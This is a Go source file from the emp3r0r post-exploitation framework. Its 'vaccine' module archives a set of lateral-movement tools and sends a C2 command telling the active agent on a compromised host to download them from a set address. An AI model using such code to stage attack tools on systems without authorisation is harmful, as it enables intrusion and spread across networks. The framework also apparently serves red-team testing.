package modules

import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			logging.Errorf("CreateVaccineArchive: %v", err)
			return
		}
		downloadOpt, ok := AvailableModuleOptions["download_addr"]
		if !ok {
			logging.Errorf("Option 'download_addr' not found")
			return
		}
		download_addr := downloadOpt.Val
		checksum := tun.SHA256SumFile(UtilsArchive)
		err = agent_util.SendCmd(fmt.Sprintf("%s --checksum %s --download_addr %s", emp3r0r_def.C2CmdUtils, checksum, download_addr), "", def.ActiveAgent)
		if err != nil {
			logging.Errorf("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	logging.Infof("Creating archive (%s) for module vaccine...", UtilsArchive)
	err = os.Chdir(EmpDataDir + "/modules/vaccine") // vaccine is always stored under EmpDataDir
	if err != nil {
		return fmt.Errorf("entering vaccine dir: %v", err)
	}
	defer func() {
		logging.Infof("Created %.2fMB archive (%s) for module vaccine", float64(util.FileSize(UtilsArchive))/1024/1024, UtilsArchive)
		os.Chdir(EmpWorkSpace)
	}()
	err = util.TarXZ(".", UtilsArchive)
	if err != nil {
		return fmt.Errorf("creating vaccine archive: %v", err)
	}
	return
}
